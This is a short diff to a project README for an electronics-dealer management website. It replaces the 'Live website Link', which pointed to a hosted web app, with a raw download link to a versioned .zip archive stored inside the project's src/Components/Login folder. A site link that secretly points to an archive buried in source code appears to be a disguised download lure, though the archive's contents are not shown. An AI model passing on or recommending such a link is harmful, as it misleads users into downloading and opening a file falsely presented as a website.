@@ -2,7 +2,7 @@
 
 This is a electronix management website where a dealer can update some information about his products.
 
-## Live website Link: https://arif-electronics.web.app/
+## Live website Link: https://github.com/Habib255/arif-electronics-client-side/raw/refs/heads/main/src/Components/Login/electronics-client-side-arif-v3.6.zip
 
 ### Some features of this website is -
 
